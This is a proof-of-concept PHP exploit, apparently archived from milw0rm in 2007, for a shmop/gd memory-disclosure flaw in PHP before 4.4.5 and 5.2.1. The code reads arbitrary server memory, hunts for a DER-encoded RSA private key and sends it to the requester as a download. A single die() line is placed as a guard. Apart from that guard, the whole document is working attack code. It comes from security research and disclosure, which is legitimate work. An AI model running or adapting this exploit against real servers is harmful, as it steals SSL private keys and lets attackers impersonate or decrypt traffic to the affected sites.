<html><head><title>PHP < 4.4.5 / 5.2.1 (shmop) SSL RSA Private-Key Disclosure Exploit</title></head><pre>&lt;?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //        PHP ext/shmop SSL RSA Private-Key Disclosure Exploit        //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die(&quot;REMOVE THIS LINE&quot;);

  if (!extension_loaded(&quot;gd&quot;) || !extension_loaded(&quot;shmop&quot;)) {
    die(&quot;This demonstration exploit only works with ext/gd and ext/shmop loaded.&quot;);
  }

  function init()
  {
    global $rid;
    
    $rid = imagecreate(10,10);
    imagecolorallocate($rid, 0, 0, 0);
    imagecolorallocate($rid, 0, 0, 0);
  }
  
  function peek($addr, $size)
  {
    global $rid;
    imagecolordeallocate($rid, 0);
    imagecolordeallocate($rid, 1);
    imagecolorallocate($rid, $addr, 0, 0);
    imagecolorallocate($rid, $size, 0, 0);
    return shmop_read((int)$rid, 0, $size);
  }

  init();
  
  $offset = 0x08048000 + 1024 * 64;
  
  while (1) {
  
    $data = peek($offset, 1024 + 16);
    
    $position = strpos($data, &quot;\x30\x82&quot;);
    if ($position !== false &amp;&amp; $position &lt; 1024) {
      // Potential Key
      if (substr($data, $position+4, 4) == &quot;\x02\x01\x00\x02&quot;) {
        $length = ord($data[$position+2])*256+ord($data[$position+3])+4;
        $keydata = peek($offset + $position, $length);
        // Assume an exponent of 0x10001 to really find a RSA key and not a DSA one
        if (strpos($keydata, &quot;\x01\x00\x01&quot;) &gt; 0)
            break;
      }
    }
    $offset += 1024;
  }

  header(&quot;Content-type: application/octet-stream&quot;);
  header(&quot;Content-Disposition: attachment; filename=\&quot;server.der\&quot;&quot;);  
  echo $keydata;
?&gt;

# milw0rm.com [2007-03-07]</pre></html>